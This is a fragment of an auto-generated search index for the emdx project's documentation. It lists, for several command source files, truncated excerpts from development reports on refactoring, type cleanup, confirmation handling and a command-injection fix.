<li><code>emdx/commands/delegate.py</code> - Uses DELEGATE_TIMEOUT_SECONDS, DISCOVERY_TIMEOUT_SECONDS</li> <li> <p><code>emdx/commands/gist.py</code> - Uses AUTH_CHEC...</p> </li> <li> <p>#6275 Delegate: DEBT-6: Remove dead code   Section: Changes Made</p> <p>...auto-remove 1033 issues including all F401 (unused imports) across the codebase:</p> </li> <li>emdx/commands/cascade.py: removed unused <code>pathlib.Path</code></li> <li>emdx/commands/maintain.py: removed <code>psutil</code>, <code>get_db_path</code></li> <li>emdx/commands/prime.py: removed <code>Panel</code>, <code>Text</code></li> <li> <p>emdx/commands/recipe....</p> </li> <li> <p>#6269 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [25/37]   Section: 4. Files Updated to Use Centralized Constants</p> <ul> <li><code>emdx/commands/cascade.py</code> - Uses <code>CASCADE_*_TIMEOUT</code></li> </ul> </li> <li><code>emdx/commands/delegate.py</code> - Uses <code>DISCOVERY_COMMAND_TIMEOUT</code></li> <li><code>emdx/commands/gist.py</code> - Uses <code>GITHUB_AUTH_TIMEOUT</code></li> <li> <p>`emdx/commands/...</p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]   Section: Files Modified</p> <ul> <li><code>emdx/commands/browse.py</code>: Added help text</li> </ul> </li> <li><code>emdx/commands/cascade.py</code>: Added empty content validation and standardized error messages</li> <li><code>emdx/commands/core.py</code>: Added empty content validation</li> <li> <p><code>emdx/commands/delegate.py</code>: Added --ver...</p> </li> <li> <p>#6252 Delegate: Remove dead code (unused imports, deprecated execute_claude_sync)   Section: 2. Deprecated execute_claude_sync Replaced</p> <p>File: <code>emdx/commands/cascade.py</code></p> </li> <li> <p>#6166 Delegate: Analyze how tasks integrate with cascade. Read emdx/commands [5/15]   Section: Current State</p> </li> <li>Purpose: Transform ideas into working code through stages</li> <li>Stages: idea \u2192 prompt \u2192 analyzed \u2192 planned \u2192 done</li> <li> <p>Execution model: Linear progression t...</p> </li> <li> <p>#6341 Delegate: R4: Centralize configuration constants. Create emdx/constant   Section: Changes Made</p> <p>...ce.py** - Uses DEFAULT_CLI_TIMEOUT_SECONDS and IMPLEMENTATION_TIMEOUT_SECONDS</p> </li> <li>emdx/commands/cascade.py - Uses DEFAULT_CLI_TIMEOUT_SECONDS and IMPLEMENTATION_TIMEOUT_SECONDS</li> <li>emdx/services/ask_service.py - Uses DEFAULT_ASK_MODEL instead of hardcoded string</li> <li>*...</li> </ul>"},{"location":"entities/emdxcommandscascadepy/#core-command-files","title":"Core Command Files","text":""},{"location":"entities/emdxcommandscascadepy/#files-modified-14-total","title":"Files Modified (14 total)","text":""},{"location":"entities/emdxcommandscascadepy/#summary","title":"Summary","text":"<p>Added comprehensive test coverage for <code>emdx/commands/cascade.py</code> with 61 new tests.</p>"},{"location":"entities/emdxcommandscascadepy/#5-files-updated-13-files","title":"5. Files Updated (13 files)","text":""},{"location":"entities/emdxcommandscascadepy/#cascade-system-emdxcommandscascadepy","title":"Cascade System (<code>emdx/commands/cascade.py</code>)","text":""},{"location":"entities/emdxcommandscascadepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/config/settings.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>validate_env_var(name, value)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>validate_database_url()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>validate_api_key(raise_on_missing=false)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>validate_all_env_vars()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>use centralized constants</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>unused imports removed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>timeout constants:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>tests/test_commands_cascade.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>summary centralized</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/emdxcommandscompactpy/","title":"emdx/commands/compact.py","text":"<p>Type: heading | Mentioned in: 12 documents | First seen: 2026-02-15</p>"},{"location":"entities/emdxcommandscompactpy/#documents-12","title":"Documents (12)","text":"<ul> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...|-------| | <code>emdx/commands/delegate.py</code> | 3 | 3 | All are <code>**kwargs</code> wrappers | | <code>emdx/commands/compact.py</code> | 7 | 5 | Similarity matrix is tricky | | <code>emdx/commands/distill.py</code> | 5 | 4 | Audience enum return is fine | | <code>emdx/commands/review.py</code> | 2 | 2 | Simple JSON seri...</p> </li> <li> <p>#6694 Fix emdx delete auto-confirm for non-TTY   Section: What was done</p> <p>...mands/maintain.py<code>| Guard all interactive wizard + index clear confirmations | |</code>emdx/commands/compact.py<code>| Guard synthesis confirmations | |</code>emdx/commands/ask.py<code>| Guard clear-index confirmation | |</code>tests/test_commands_core.py` | Added 2 new tests for non-TTY auto-c...</p> </li> <li> <p>#6687 Fix emdx delete auto-confirm for non-TTY   Section: Changes</p> <p>...<code>emdx/commands/tags.py</code> \u2014 <code>tag rename</code>, <code>tag merge</code>, <code>tag batch</code> confirmations</p> </li> <li><code>emdx/commands/compact.py</code> \u2014 synthesis confirmations (2 locations)</li> <li><code>emdx/commands/ask.py</code> \u2014 <code>ai clear-index</code> confirmation</li> <li> <p><code>emdx/commands/maintain.py</code> \u2014 all <code>Confirm.ask</code> and `typer.confir...</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: Production Code \u2014 UI/Display Emojis (NOT in EMOJI_ALIASES)</p> <p>...s | | <code>emdx/commands/status.py</code> | 82, 145, 165 | \u26a1\ud83d\udccb\u274c | Status display headers | | <code>emdx/commands/compact.py</code> | 417, 491, 493, 496 | \u2705\u274c | Compaction result messages | | <code>emdx/commands/review.py</code> | 94, 174, 242, 287, 294, 295 | \ud83d\udccb\u2705\u274c\ud83d\udcca | Review command output | | `emdx/commands...</p> </li> <li> <p>#6516 Any removal Phase 4: Command/Model TypedDicts</p> </li> </ul>"},{"location":"entities/emdxcommandscompactpy/#any-removal-phase-4-commandmodel-typeddicts","title":"Any Removal Phase 4: Command/Model TypedDicts","text":""},{"location":"entities/emdxcommandscompactpy/#summary","title":"Summary","text":"<p>Replaced <code>Any</code> type annotations with proper TypedDicts and typed imports in the following files:</p>"},{"location":"entities/emdxcommandscompactpy/#1-emdxcommandscompactpy","title":"1. <code>emdx/commands/compact.py</code>","text":"<p>Changes: - Added <code>TYPE_CHECKING</code> guard with numpy im...</p> <ul> <li>#6509 Any Type Removal Analysis [synthesis]   Section: Files Changed by Priority <p>...5 occurrences)</p> </li> <li><code>emdx/ui/command_palette/palette_presenter.py</code> (4 occurrences)</li> <li><code>emdx/commands/compact.py</code> (6 occurrences)</li> <li> <p><code>emdx/commands/distill.py</code> (4 occurrences)</p> </li> <li> <p>#6499 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...|---------|-------| | <code>emdx/commands/delegate.py</code> | 3 | 3 | **kwargs patterns | | <code>emdx/commands/compact.py</code> | 8 | 6 | sklearn matrix + dict patterns | | <code>emdx/commands/distill.py</code> | 5 | 4 | Audience enum + dict patterns | | <code>emdx/commands/review.py</code> | 1 | 1 | JSON output...</p> </li> <li> <p>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Implementation Components</p> </li> <li>Registered as lazy command in <code>main.py</code></li> <li>Discovery mode: Free TF-IDF clustering  </li> <li>Synthesis mode: Claude API merging</li> <li> <p>Archives originals with <code>superseded</code> tags</p> </li> <li> <p>#6449 Implement emdx compact command   Section: Implementation Complete</p> <p>...`** - Shared service for AI-powered document synthesis using Claude Opus API</p> </li> <li><code>emdx/commands/compact.py</code> - CLI command with TF-IDF clustering (free discovery) and AI synthesis</li> <li> <p><code>tests/test_compact.py</code> - 14 tests covering clustering, synthesis, and CLI behavior</p> </li> <li> <p>#6448 Implement emdx compact command   Section: Components Created</p> </li> <li>Registered as lazy command in <code>main.py</code></li> <li>Discovery mode (<code>--dry-run</code>): Free, local TF-IDF clustering</li> <li> <p>Synthesis mode: Claude Opus API for intelligent merging -...</p> </li> <li> <p>#6368 Gameplans: compact, distill, and draft-pr [synthesis]   Section: 1. <code>emdx compact</code> Command</p> <p>New Files:</p> </li> <li><code>emdx/services/synthesis_service.py</code> \u2014 Shared synthesis logic</li> <li><code>emdx/commands/compact.py</code> \u2014 CLI implementation</li> <li> <p><code>tests/test_compact.py</code> \u2014 Test suite</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Key Files</p> <p>...es/synthesis_service.py<code>| NEW | Shared synthesis logic for compact + distill | |</code>emdx/commands/compact.py<code>| NEW | CLI command implementation | |</code>emdx/services/document_merger.py<code>| EXTEND | Add</code>group_clusters()<code>method | |</code>emdx/config/constants.py<code>| EXTEND | Add</code>CO...</p> </li> </ul>"},{"location":"entities/emdxcommandscompactpy/#compact-command-emdxcommandscompactpy","title":"Compact Command (<code>emdx/commands/compact.py</code>)","text":""},{"location":"entities/emdxcommandscompactpy/#2-compact-command-emdxcommandscompactpy","title":"2. Compact Command (<code>emdx/commands/compact.py</code>)","text":""},{"location":"entities/emdxcommandscompactpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/commands/review.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>synthesis layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>future extensions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>emdx compact --schedule weekly</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>discovery layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>archive layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>update_task(task_id: int, **kwargs: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>update_group(group_id: int, **kwargs: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>update_execution(exec_id: int, **kwargs: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>sys.stdin.isatty()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/emdxcommandscorepy/","title":"emdx/commands/core.py","text":"<p>Type: heading | Mentioned in: 25 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxcommandscorepy/#documents-25","title":"Documents (25)","text":"<ul> <li>#6502 None Type Analysis [1/7] <ul> <li><code>cat: str | None</code> \u2014 NECESSARY, optional. ---</li> </ul> </li> </ul>"},{"location":"entities/emdxcommandscorepy/#emdxcommandscorepy_1","title":"emdx/commands/core.py","text":""},{"location":"entities/emdxcommandscorepy/#dataclass-inputcontent-lines-46-53","title":"Dataclass: <code>InputContent</code> (lines 46-53)","text":"<pre><code>@dataclass\nclass InputContent:\n    content: str\n    source_type: str\n    source_path: Path | None = None\n</code></pre> <p>**Verdict...</p> <ul> <li>#6495 None Type Analysis [1/7] <p>VERDICT: LEGITIMATE \u2014 <code>jobs</code> genuinely accepts <code>None</code> as \"auto\" mode. ---</p> </li> </ul>"},{"location":"entities/emdxcommandscorepy/#legitimate-none-annotations-in-delegatepy","title":"LEGITIMATE None Annotations in delegate.py","text":"Line Signature Why None is Valid 60-68 `_safe_create_task() -&gt; int | ... <ul> <li>#6844 Delegate: ARCH-9 (Issue #1240): Filter emdx find by doc_type. Default  [1/2] <p>...dded <code>doc_type</code> parameter to <code>list_documents()</code> and <code>get_recent_documents()</code></p> </li> <li><code>emdx/commands/core.py</code> \u2014 Added <code>--wiki</code> and <code>--all-types</code> CLI flags to <code>find</code> command, threaded <code>doc_type</code> through all search paths</li> <li> <p><code>emdx/services/hybrid_search.py</code> \u2014 Added `doc_...</p> </li> <li> <p>#6694 Fix emdx delete auto-confirm for non-TTY   Section: What was done</p> <p>...----|--------| | <code>emdx/utils/output.py</code> | Added <code>is_non_interactive()</code> helper | | <code>emdx/commands/core.py</code> | Guard delete confirmation | | <code>emdx/commands/trash.py</code> | Guard restore --all and purge confirmations | | <code>emdx/commands/tasks.py</code> | Guard task delete confirmation...</p> </li> <li> <p>#6687 Fix emdx delete auto-confirm for non-TTY   Section: Changes</p> <p>Commands fixed (9 files, all interactive prompts now skip when non-TTY):</p> </li> <li><code>emdx/commands/core.py</code> \u2014 <code>delete</code> command (soft + hard delete confirmations)</li> <li><code>emdx/commands/trash.py</code> \u2014 <code>purge</code> and <code>restore --all</code> confirmations</li> <li> <p><code>emdx/commands/tasks.py</code> \u2014 `task dele...</p> </li> <li> <p>#6616 Delegate: Remove the emoji alias system from emdx. This is a big-bang    Section: Changes Made</p> <p>...s.py` \u2014 Removed expand_aliases calls, normalize_tag_to_emoji calls, dedup logic</p> </li> <li><code>emdx/commands/core.py</code> \u2014 Removed expand_alias_string import and calls</li> <li><code>emdx/services/auto_tagger.py</code> \u2014 Removed EMOJI_ALIASES lookup, use tag directly</li> <li> <p><code>emdx/services/ask_service.py</code> \u2014...</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: 3. <code>expand_alias_string</code> (function)</p> <p>...------|------|-------| | <code>emdx/utils/emoji_aliases.py</code> | 152 | Definition | | <code>emdx/commands/core.py</code> | 39 | Import: <code>from emdx.utils.emoji_aliases import expand_alias_string</code> | | <code>emdx/commands/core.py</code> | 155 | Usage: Tag expansion during save | | `emdx/com...</p> </li> <li> <p>#6609 Delegate: Investigate removing the emoji alias system from emdx. The s [1/2]   Section: Implementation Plan</p> <p>...y<code>\u2014 remove all</code>expand_aliases()<code>and</code>normalize_tag_to_emoji()` calls</p> </li> <li>Update <code>emdx/commands/core.py</code> \u2014 remove <code>expand_alias_string()</code> calls</li> <li>Update <code>emdx/services/auto_tagger.py</code> \u2014 remove <code>EMOJI_ALIASES</code> lookup</li> <li> <p>Update <code>emdx/services/unified_search.py</code> \u2014 remove...</p> </li> <li> <p>#6512 None Type Analysis [synthesis]   Section: Key Findings</p> </li> </ul>"},{"location":"entities/emdxcommandscorepy/#1-dead-code-found","title":"1. Dead Code Found","text":"<p><code>emdx/commands/core.py</code> \u2014 <code>DocumentMetadata.tags</code> field is never used and should be removed entirely: ```python</p>"},{"location":"entities/emdxcommandscorepy/#before","title":"BEFORE","text":"<p>@dataclass class DocumentMetadata:     title: str     project: st...</p> <ul> <li>#6474 EMDX Feature Implementation Synthesis   Section: Implementation Details <p>...**: <code>emdx/services/contextual_save.py</code> contains core logic</p> </li> <li>CLI Integration: <code>emdx/commands/core.py</code> adds <code>check</code> command and <code>--smart</code> flag</li> <li>Similarity Detection: Uses TF-IDF embeddings with cosine similarity</li> <li> <p>Fallback: FTS5 keyword search when embedding...</p> </li> <li> <p>#6422 Delegate: Research upgrading rich from 13.x to 14.x. Identify breaking [3/5]   Section: Impact on EMDX Codebase</p> <ol> <li>Markdown rendering in <code>emdx/ui/markdown_config.py</code> and <code>emdx/commands/core.py</code></li> </ol> </li> <li>Markdown table/header styles changed</li> <li> <p>May affect visual appearance but not functionality</p> </li> <li> <p>#6351 Delegate: Analyze upgrading typer from ^0.15.0 to ^0.23.1 for the emdx [1/2]   Section: 2.1 <code>typing.Literal</code> Support (v0.19.0)</p> <p>Files that could benefit:</p> </li> <li><code>emdx/commands/core.py</code> (group_role parameter)</li> <li><code>emdx/commands/tags.py</code> (tag operations)</li> <li> <p><code>emdx/commands/cascade.py</code> (cascade stage options)</p> </li> <li> <p>#6342 Delegate: Document #6330 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/emdxcommandscorepy/#emdx-arc-212","title":"EMDX Arc [2/12]","text":"<p>Section: Changes Made</p> <ul> <li>#6340 Delegate: Truncate Function Consolidation [1/12]   Section: Changes Made <p>...s/executions.py<code>**: 2 call sites updated to use</code>DESCRIPTION_TRUNCATE_LENGTH`</p> </li> <li> <p><code>emdx/commands/core.py</code>: 1 call site updated</p> </li> <li> <p>#6303 Delegate: DEBT-10 RETRY: Fix type safety debt in the emdx project. Foc   Section: Functions with Return Type Annotations</p> <p>emdx/commands/core.py:</p> </li> <li><code>get_input_content()</code> - already typed</li> <li><code>generate_title()</code> - already typed</li> <li><code>detect_project()</code> - already typed</li> <li><code>create_document()</code> - already typed</li> <li> <p>`apply_t...</p> </li> <li> <p>#6266 Delegate: Document #6230 (Delegate: Audit CONFIGURATION DEBT in the emdx project)   Section: Files Modified</p> <p>...se timeout/branch constants)</p> </li> <li><code>emdx/utils/git.py</code> (add get_default_branch())</li> <li><code>emdx/commands/core.py</code> (use DEFAULT_EDITOR)</li> <li> <p><code>emdx/main.py</code> (use BOOL_TRUTHY_VALUES)</p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]   Section: Files Modified</p> <p>...nds/cascade.py`: Added empty content validation and standardized error messages</p> </li> <li><code>emdx/commands/core.py</code>: Added empty content validation</li> <li><code>emdx/commands/delegate.py</code>: Added --verbose flag with module-level tracking, improved help text</li> <li> <p><code>emdx/commands/executions.py</code>:...</p> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)</p> <p>...ed | | <code>emdx/commands/prime.py</code> | 334-336 | DB query failure silently ignored | | <code>emdx/commands/core.py</code> | 321-322 | Gist metadata save failure silently ignored | | <code>emdx/ui/search/search_screen.py</code> | 212-213 | Button state update silently ignored | | `emdx/ui/search/s...</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udd34 CRITICAL: Silent Failures (except: pass)</p> <p>...| 75-76 | <code>_safe_update_execution()</code> - execution updates silently fail | HIGH | | <code>emdx/commands/core.py</code> | 321-322 | Gist creation silently fails (non-fatal but no logging) | MEDIUM | | <code>emdx/commands/prime.py</code> | 334-336 | Cascade stage query silently fails | MEDIUM |...</p> </li> <li> <p>#6150 Delegate: Review PR #448 (Contextual Save). Run: gh pr diff 448. Check [2/7]   Section: Summary</p> <p>PR Title: feat(save): contextual save with duplicate prevention (Issue #6097) Files Changed: 2 (461 additions, 0 deletions)</p> </li> <li><code>emdx/commands/core.py</code> (+128 lines)</li> <li> <p><code>emdx/services/contextual_save.py</code> (+333 lines, new file)</p> </li> <li> <p>#6143 Delegate: Read gameplan by running: emdx view 6098. Implement the Auto [2/7]   Section: CLI Commands</p> <p>...Added migration_036</p> </li> <li><code>emdx/services/linking_service.py</code> \u2014 New file (350 lines)</li> <li><code>emdx/commands/core.py</code> \u2014 Added --auto-link flag, view links display</li> <li> <p><code>emdx/commands/ask.py</code> \u2014 Added links, link, link-stats commands</p> </li> <li> <p>#6139 Delegate: Read gameplan by running: emdx view 6097. Implement the Cont [1/7]   Section: Files created/modified:</p> <ul> <li><code>emdx/commands/core.py</code> (modified):</li> </ul> </li> <li>Added <code>check</code> command</li> <li> <p>Added <code>--smart</code> flag to <code>save</code> command</p> </li> <li> <p>#6429 Delegate: Task #359: Fix Semantic Find CI failures. The branch feat/se [2/2]   Section: Key Changes</p> <p>...ept chunk indexing features from feat/semantic-find, applied line length fixes</p> </li> <li>emdx/commands/core.py: Kept hybrid search code from feat/semantic-find, resolved conflicts with main</li> <li>emdx/database/migrations.py: Renumbered chunk_embeddings to migration 40 (main...</li> </ul>"},{"location":"entities/emdxcommandscorepy/#2-updated-imports-10-files","title":"2. Updated Imports (10 files)","text":"<ul> <li><code>emdx/commands/prime.py</code> - get_git_project</li> <li><code>emdx/commands/core.py</code> - get_git_project</li> <li><code>emdx/commands/delegate.py</code> (4 locations) - create_worktree_simple, cleanup_worktree</li> <li><code>emdx/ui/activity/activity_view.py</code> - get_git_project</li> <li>`...</li> </ul>"},{"location":"entities/emdxcommandscorepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/commands/trash.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.1)</li> <li><code>source_path</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>phase 1: database migration</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>emdx/commands/core.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>emdx/commands/tags.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.9)</li> <li><code>tests/test_emoji_aliases.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.8)</li> <li><code>emdx/utils/__init__.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.8)</li> <li><code>emdx/ui/formatting.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.8)</li> <li><code>emdx/services/auto_tagger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.8)</li> <li><code>emdx/commands/status.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.8)</li> </ul>"},{"location":"entities/emdxcommandsdelegatepy/","title":"emdx/commands/delegate.py","text":"<p>Type: heading | Mentioned in: 82 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxcommandsdelegatepy/#documents-82","title":"Documents (82)","text":"<ul> <li>#6608 Delegate: Remove the --each/--do dynamic discovery feature from emdx d   Section: Changes Made </li> <li>Removed the <code>SAFE_DISCOVERY_COMMANDS</code> frozenset (allowlist of safe shell commands)</li> <li> <p>Removed <code>_validate_discovery_command()</code> function (command parsing and allowlis...</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: Summary</p> ...File Any Count Removable Notes <code>emdx/commands/delegate.py</code> 3 3 All are <code>**kwargs</code> wrappers <code>emdx/commands/compact.py</code> 7 5 Similarity matrix is tricky <code>emdx/commands/distill.py</code> 5 4 Audience enum re... </li> <li> <p>#6502 None Type Analysis [1/7]</p> </li> </ul> <p>Analysis of <code>| None</code> type annotations to determine if None is necessary (Typer default, truly nullable) or unnecessary (always has value at runtime, could be narrowed). ---</p>"},{"location":"entities/emdxcommandsdelegatepy/#emdxcommandsdelegatepy_1","title":"emdx/commands/delegate.py","text":""},{"location":"entities/emdxcommandsdelegatepy/#none-type-annotation-analysis-delegatepy-and-corepy","title":"None Type Annotation Analysis: delegate.py and core.py","text":""},{"location":"entities/emdxcommandsdelegatepy/#emdxcommandsd","title":"emdx/commands/d...","text":"<ul> <li>#6495 None Type Analysis [1/7] </li> </ul> <p>Analysis of <code>| None</code> type annotations to identify which are unnecessary (the value is always present at runtime). ## Summary</p> <p>| File | Unnecessary <code>| None</code> | Legitimate <code>| None</code> | Total Analyzed | |---...</p> <ul> <li>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4] <p><code>calculate_overall_health() -&gt; dict[str, Any]</code></p> </li> <li>Location: Line 58</li> <li>Current Type: <code>dict[str, Any]</code></li> <li> <p>Actual Type: Create TypedDict <code>OverallHealth</code> with: `overall_score: float, overall_status: str, metrics: dict[str, HealthMetric], statis...</p> </li> <li> <p>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands   Section: Summary</p> <p>Fixed a command injection vulnerability (DEBT-1) in <code>emdx/commands/delegate.py</code> where the <code>_run_discovery()</code> function used <code>shell=True</code> with user input from the <code>--each</code> flag, enabling arbitrary command execution.</p> </li> <li> <p>#6849 Delegate: FIX-5: In emdx/commands/delegate.py _run_parallel(), around  [2/4]   Section: Summary</p> <p>Fix: In <code>emdx/commands/delegate.py</code> <code>_run_parallel()</code>, the synthesis <code>_run_single</code> call at line ~1008 was missing the <code>limit</code> parameter. Individual parallel tasks correctly received <code>limit</code> (line 890)...</p> </li> <li> <p>#6845 Delegate: Implement FEAT-47: When a delegate is launched with both --t   Section: Summary of changes</p> <p><code>emdx/commands/delegate.py</code>:</p> </li> <li> <p>Added <code>epic_id: str | None</code> parameter to <code>_make_pr_instruction()</code> \u2014 when provided, the PR title example in the instruction becomes `\"feat: ... <li> <p>#6842 Delegate: Add a --task flag to the delegate command that sets the EMDX</p> <p>Summary of changes (<code>emdx/commands/delegate.py</code>):</p> </li> <li> <p>#6839 Delegate: list</p> <p>Here's a summary of what the two changes fix:</p> </li>"},{"location":"entities/emdxcommandsdelegatepy/#none-type-analysis-delegatepy-corepy","title":"None Type Analysis: delegate.py &amp; core.py","text":""},{"location":"entities/emdxcommandsdelegatepy/#summary","title":"Summary","text":"<p>The working copy contains two fixes that resolve <code>emdx delegate list</code> (and other delegate subcommands) being broken:</p>"},{"location":"entities/emdxcommandsdelegatepy/#1-emdxcommandsdelegatepy-subcommand-routing-fix","title":"1. <code>emdx/commands/delegate.py</code> \u2014 Subcommand routing fix","text":"<p>Problem:...</p> <ul> <li> <p>#6838 Delegate: list [1/3]   Section: The fix in progress</p> <p>The diff at <code>emdx/commands/delegate.py</code> shows a fix that checks if <code>tasks[0]</code> matches a known subcommand name:</p> </li> <li> <p>#6837 Delegate: list [1/2]   Section: Fix: Delegate subcommand routing (<code>list</code>, <code>running</code>, <code>stats</code>, etc.)</p> <ol> <li><code>emdx/commands/delegate.py</code> (lines 1203-1215): Added subcommand detection at the top of <code>delegate()</code>. If <code>tasks[0]</code> matches a registered subcommand name (via <code>ctx.command.get_command()</code>), it...</li> </ol> </li> <li> <p>#6835 Delegate: list   Section: Changes on disk (uncommitted)</p> <p><code>emdx/commands/delegate.py</code>:</p> </li> <li>Added <code>import click</code> </li> <li> <p>Added subcommand routing logic (lines 1204-1215) that detects when a subcommand name like \"list\" is consumed as a task argument and re-...</p> </li> <li> <p>#6836 Delegate: list   Section: Changes</p> <p><code>emdx/commands/delegate.py</code> (3 changes):</p> </li> <li>Added <code>import click</code> \u2014 needed for the <code>isinstance(ctx.command, click.MultiCommand)</code> type check</li> <li> <p>**Removed hardcoded <code>help=</code> from `typer.Type...</p> </li> <li> <p>#6833 Delegate: list   Section: Summary</p> </li> <li>Removed the <code>help=</code> string from the Typer constructor (the docstring handles it)</li> <li> <p>Added subcommand detection at the top of `dele...</p> </li> <li> <p>#6830 Delegate: --help [2/2]</p> <p><code>emdx/commands/delegate.py</code>:</p> </li> <li>Removed <code>help=</code> from <code>typer.Typer()</code> \u2014 the <code>delegate()</code> function's docstring now serves as the help text, giving the rich description with all 